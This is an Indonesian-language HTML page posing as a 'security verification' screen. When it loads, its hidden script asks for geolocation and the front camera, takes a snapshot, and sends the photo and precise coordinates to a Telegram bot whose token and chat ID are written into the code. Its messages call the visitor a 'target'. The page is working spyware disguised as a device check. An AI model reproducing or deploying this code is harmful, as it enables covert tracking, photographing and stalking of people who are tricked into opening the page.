<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background: #1e1e1e;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #03a9f4;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h3>Memverifikasi Perangkat...</h3>
        <p>Mohon izinkan akses yang diminta untuk melanjutkan.</p>
        <div class="spinner"></div>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
        const CHAT_ID = '8664741564';

        async function kirimKeTelegram(blobFoto, lat, lon) {
            try {
                // 1. Kirim Data Lokasi (Jika tersedia)
                if (lat && lon) {
                    const teksLokasi = `[+] Target Lokasi Ditemukan:\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Maps: https://maps.google.com/?q=${lat},${lon}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: teksLokasi })
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: '[-] Akses lokasi ditolak atau tidak tersedia.' })
                    });
                }

                // 2. Kirim Foto Snapshot Kamera (Jika tersedia)
                if (blobFoto) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blobFoto, 'snapshot.jpg');
                    formData.append('caption', '[+] Snapshot Kamera Berhasil Diambil');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: '[-] Akses kamera ditolak atau gagal.' })
                    });
                }
            } catch (err) {
                console.error('Error saat transmisi:', err);
            }
        }

        // Eksekusi Pengambilan Data
        function eksekusi() {
            let latitude = null;
            let longitude = null;

            // Ambil Geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        ambilKamera(latitude, longitude);
                    },
                    (error) => {
                        ambilKamera(null, null);
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            } else {
                ambilKamera(null, null);
            }
        }

        // Ambil Stream Kamera & Snapshot
        function ambilKamera(lat, lon) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const canvas = document.getElementById('c');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            canvas.toBlob(blob => {
                                kirimKeTelegram(blob, lat, lon);
                                // Hentikan track kamera setelah capture
                                stream.getTracks().forEach(track => track.stop());
                            }, 'image/jpeg', 0.85);
                        }, 1500); // Jeda 1.5 detik agar stream stabil
                    };
                })
                .catch(err => {
                    kirimKeTelegram(null, lat, lon);
                });
        }

        window.onload = eksekusi;
    </script>
</body>
</html>
